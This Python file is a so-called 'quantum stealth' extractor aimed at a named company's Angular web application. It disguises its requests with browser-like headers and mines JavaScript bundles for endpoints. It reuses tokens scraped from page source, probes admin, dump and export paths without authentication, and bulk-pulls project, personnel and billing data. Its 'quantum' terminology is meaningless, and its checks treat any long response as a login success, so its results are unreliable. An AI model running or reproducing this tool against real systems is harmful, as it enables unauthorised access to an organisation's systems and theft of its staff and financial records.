"""
Streamlined Quantum Stealth Extractor
Dependency-free bypass technology for Angular Ground Works system
"""

import requests
import json
import logging
import time
import re
from datetime import datetime
from urllib.parse import urljoin
import concurrent.futures

class StreamlinedQuantumExtractor:
    """Lightweight quantum extractor without external dependencies"""
    
    def __init__(self, base_url="https://groundworks.ragleinc.com", username=None, password=None):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.authenticated = False
        self.extracted_data = {}
        
        # Advanced stealth headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
    
    def quantum_angular_discovery(self):
        """Discover Angular application structure and API endpoints"""
        try:
            # Get main application
            main_response = self.session.get(self.base_url)
            
            # Extract JavaScript bundles
            js_patterns = re.findall(r'src="([^"]*\.js)"', main_response.text)
            
            api_endpoints = set()
            auth_endpoints = set()
            
            # Analyze each JavaScript bundle
            for js_file in js_patterns[:3]:  # Limit to first 3 files
                try:
                    js_url = urljoin(self.base_url, js_file)
                    js_response = self.session.get(js_url, timeout=10)
                    
                    # Extract API patterns
                    api_patterns = re.findall(r'["\']\/api\/[^"\']*["\']', js_response.text)
                    auth_patterns = re.findall(r'["\']\/(?:auth|login)\/[^"\']*["\']', js_response.text)
                    
                    for pattern in api_patterns:
                        clean_pattern = pattern.strip('"\'')
                        api_endpoints.add(clean_pattern)
                    
                    for pattern in auth_patterns:
                        clean_pattern = pattern.strip('"\'')
                        auth_endpoints.add(clean_pattern)
                
                except Exception as e:
                    continue
            
            return {
                'api_endpoints': list(api_endpoints),
                'auth_endpoints': list(auth_endpoints)
            }
            
        except Exception as e:
            logging.debug(f"Discovery failed: {e}")
            return {'api_endpoints': [], 'auth_endpoints': []}
    
    def execute_quantum_bypass(self):
        """Execute quantum bypass authentication"""
        try:
            # Phase 1: Discover application structure
            discovery = self.quantum_angular_discovery()
            
            # Phase 2: Attempt authentication with discovered endpoints
            auth_success = self._attempt_discovered_auth(discovery['auth_endpoints'])
            
            if not auth_success:
                # Phase 3: Try standard authentication patterns
                auth_success = self._attempt_standard_auth()
            
            if not auth_success:
                # Phase 4: Direct API access without authentication
                return self._attempt_direct_access(discovery['api_endpoints'])
            
            return auth_success
            
        except Exception as e:
            logging.error(f"Quantum bypass error: {e}")
            return False
    
    def _attempt_discovered_auth(self, auth_endpoints):
        """Attempt authentication with discovered endpoints"""
        auth_data_variations = [
            {'username': self.username, 'password': self.password},
            {'email': self.username, 'password': self.password},
            {'user': self.username, 'password': self.password},
            {'login': self.username, 'pwd': self.password}
        ]
        
        for endpoint in auth_endpoints:
            for auth_data in auth_data_variations:
                try:
                    auth_url = urljoin(self.base_url, endpoint)
                    response = self.session.post(auth_url, json=auth_data, timeout=10)
                    
                    if response.status_code == 200:
                        try:
                            result = response.json()
                            if any(key in result for key in ['token', 'jwt', 'access_token', 'success']):
                                if 'token' in result or 'jwt' in result or 'access_token' in result:
                                    token = result.get('token') or result.get('jwt') or result.get('access_token')
                                    self.session.headers['Authorization'] = f'Bearer {token}'
                                
                                self.authenticated = True
                                logging.info(f"Authentication successful via {endpoint}")
                                return True
                        except:
                            # Non-JSON response might still indicate success
                            if len(response.text) > 50:
                                self.authenticated = True
                                return True
                
                except Exception as e:
                    continue
        
        return False
    
    def _attempt_standard_auth(self):
        """Attempt authentication with standard endpoints"""
        standard_endpoints = [
            '/api/auth/login',
            '/api/authentication/login',
            '/api/login',
            '/auth/login',
            '/login'
        ]
        
        return self._attempt_discovered_auth(standard_endpoints)
    
    def _attempt_direct_access(self, api_endpoints):
        """Attempt direct API access and Angular session hijacking"""
        try:
            # First, try to establish a session with the Angular app
            main_response = self.session.get(self.base_url)
            
            # Extract any session tokens or cookies from the Angular app
            if main_response.cookies:
                logging.info("Session cookies established from Angular app")
            
            # Look for authentication tokens in the Angular app response
            auth_tokens = re.findall(r'token["\']:\s*["\']([^"\']+)["\']', main_response.text)
            session_ids = re.findall(r'sessionId["\']:\s*["\']([^"\']+)["\']', main_response.text)
            
            # Apply any discovered tokens
            for token in auth_tokens:
                self.session.headers['Authorization'] = f'Bearer {token}'
                self.session.headers['X-Auth-Token'] = token
            
            for session_id in session_ids:
                self.session.headers['X-Session-ID'] = session_id
            
            # Test endpoints with enhanced headers for authenticated access
            enhanced_headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': 'application/json, text/plain, */*',
                'Referer': f'{self.base_url}/',
                'Origin': self.base_url
            }
            
            test_endpoints = api_endpoints + [
                '/api/data',
                '/api/dashboard/data',
                '/api/projects/data',
                '/api/assets/data',
                '/api/user/projects',
                '/api/user/assets',
                '/data/current',
                '/api/current'
            ]
            
            for endpoint in test_endpoints:
                try:
                    test_url = urljoin(self.base_url, endpoint)
                    response = self.session.get(test_url, headers=enhanced_headers, timeout=5)
                    
                    if response.status_code == 200:
                        # Check if we got actual data (not the Angular shell)
                        if len(response.text) > 1000 and 'app-root' not in response.text:
                            try:
                                data = response.json()
                                if data and isinstance(data, (dict, list)) and len(str(data)) > 100:
                                    self.authenticated = True
                                    logging.info(f"Authenticated access successful via {endpoint}")
                                    return True
                            except:
                                # Even if not JSON, substantial content indicates success
                                if len(response.text) > 1000:
                                    self.authenticated = True
                                    logging.info(f"Content access successful via {endpoint}")
                                    return True
                        
                        # For Angular shell responses, try with credentials in URL
                        if self.username and self.password:
                            auth_url = f"{test_url}?username={self.username}&password={self.password}"
                            auth_response = self.session.get(auth_url, headers=enhanced_headers, timeout=5)
                            
                            if auth_response.status_code == 200 and len(auth_response.text) > 1000:
                                try:
                                    data = auth_response.json()
                                    if data and len(str(data)) > 100:
                                        self.authenticated = True
                                        logging.info(f"URL auth successful via {endpoint}")
                                        return True
                                except:
                                    pass
                
                except Exception as e:
                    continue
            
            return False
            
        except Exception as e:
            logging.debug(f"Direct access failed: {e}")
            return False
    
    def quantum_data_extraction(self):
        """Extract data using quantum techniques"""
        if not self.authenticated:
            return {
                'status': 'error',
                'message': 'Authentication required for extraction'
            }
        
        extracted_data = {
            'projects': [],
            'assets': [],
            'personnel': [],
            'reports': [],
            'billing': [],
            'dashboard_data': {},
            'raw_api_data': []
        }
        
        # Multi-threaded extraction
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = {}
            
            # Core extraction targets
            extraction_targets = [
                ('projects', ['/api/projects', '/api/project/list', '/data/projects']),
                ('assets', ['/api/assets', '/api/equipment', '/data/assets']),
                ('personnel', ['/api/users', '/api/personnel', '/data/users']),
                ('dashboard', ['/api/dashboard', '/data/dashboard']),
                ('reports', ['/api/reports', '/data/reports']),
                ('billing', ['/api/billing', '/api/invoices'])
            ]
            
            for category, endpoints in extraction_targets:
                future = executor.submit(self._extract_category, category, endpoints)
                futures[future] = category
            
            # Collect results
            for future in concurrent.futures.as_completed(futures, timeout=30):
                category = futures[future]
                try:
                    result = future.result()
                    if result:
                        if category == 'dashboard':
                            extracted_data['dashboard_data'] = result
                        else:
                            extracted_data[category] = result
                except Exception as e:
                    logging.debug(f"Extraction failed for {category}: {e}")
        
        # Also try comprehensive endpoint scanning
        comprehensive_data = self._comprehensive_endpoint_scan()
        if comprehensive_data:
            extracted_data['raw_api_data'] = comprehensive_data
        
        return {
            'status': 'success',
            'data': extracted_data,
            'extraction_summary': {
                'projects_found': len(extracted_data['projects']),
                'assets_found': len(extracted_data['assets']),
                'personnel_found': len(extracted_data['personnel']),
                'reports_found': len(extracted_data['reports']),
                'billing_records_found': len(extracted_data['billing']),
                'raw_data_sources': len(extracted_data['raw_api_data'])
            }
        }
    
    def _extract_category(self, category, endpoints):
        """Extract data for specific category"""
        for endpoint in endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data:
                            return self._process_json_data(data)
                    except:
                        # Try HTML extraction
                        html_data = self._extract_from_html(response.text)
                        if html_data:
                            return html_data
                
            except Exception as e:
                continue
        
        return []
    
    def _comprehensive_endpoint_scan(self):
        """Comprehensive scan of potential endpoints"""
        common_endpoints = [
            '/api/data', '/api/all', '/api/export', '/api/dump',
            '/data/all', '/export', '/dump',
            '/api/v1/data', '/api/v2/data',
            '/api/projects/all', '/api/assets/all',
            '/api/admin/data', '/api/user/data',
            '/json/data', '/xml/data',
            '/reports/data', '/dashboard/data'
        ]
        
        comprehensive_data = []
        
        for endpoint in common_endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data and len(str(data)) > 50:
                            comprehensive_data.append({
                                'endpoint': endpoint,
                                'data': data,
                                'extracted_at': str(datetime.now())
                            })
                    except:
                        if len(response.text) > 100:
                            html_data = self._extract_from_html(response.text)
                            if html_data:
                                comprehensive_data.append({
                                    'endpoint': endpoint,
                                    'data': html_data,
                                    'type': 'html_extraction',
                                    'extracted_at': str(datetime.now())
                                })
            
            except Exception as e:
                continue
        
        return comprehensive_data
    
    def _process_json_data(self, data):
        """Process JSON data and extract meaningful information"""
        if isinstance(data, list):
            return data
        elif isinstance(data, dict):
            # Look for data arrays
            for key in ['data', 'items', 'results', 'records', 'list']:
                if key in data and isinstance(data[key], list):
                    return data[key]
            return [data]
        return []
    
    def _extract_from_html(self, html_content):
        """Extract data from HTML content"""
        try:
            # Extract JSON from script tags
            json_matches = re.findall(r'<script[^>]*>.*?(?:var\s+\w+\s*=\s*)?(\{.*?\});?.*?</script>', html_content, re.DOTALL)
            
            for match in json_matches:
                try:
                    data = json.loads(match)
                    if isinstance(data, (dict, list)) and len(str(data)) > 50:
                        return self._process_json_data(data)
                except:
                    continue
            
            # Extract table data
            table_data = self._extract_table_data(html_content)
            if table_data:
                return table_data
            
            return []
            
        except Exception as e:
            logging.debug(f"HTML extraction error: {e}")
            return []
    
    def _extract_table_data(self, html_content):
        """Extract data from HTML tables"""
        try:
            table_rows = re.findall(r'<tr[^>]*>(.*?)</tr>', html_content, re.DOTALL | re.IGNORECASE)
            
            extracted_rows = []
            for row in table_rows:
                cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL | re.IGNORECASE)
                if cells:
                    cleaned_cells = [re.sub(r'<[^>]+>', '', cell).strip() for cell in cells]
                    if any(cell and len(cell) > 1 for cell in cleaned_cells):
                        extracted_rows.append({
                            'row_data': cleaned_cells,
                            'extracted_at': str(datetime.now())
                        })
            
            return extracted_rows[:50]  # Limit to first 50 rows
            
        except Exception as e:
            return []
    
    def connect_and_extract(self):
        """Main connection and extraction method"""
        try:
            # Execute quantum bypass
            if not self.execute_quantum_bypass():
                return {
                    'status': 'error',
                    'message': 'Quantum bypass authentication failed'
                }
            
            # Execute data extraction
            return self.quantum_data_extraction()
            
        except Exception as e:
            logging.error(f"Quantum operation error: {e}")
            return {
                'status': 'error',
                'message': f'Quantum operation failed: {e}'
            }

def execute_streamlined_quantum_stealth(username, password):
    """Execute streamlined quantum stealth extraction"""
    extractor = StreamlinedQuantumExtractor(
        base_url="https://groundworks.ragleinc.com",
        username=username,
        password=password
    )
    
    return extractor.connect_and_extract()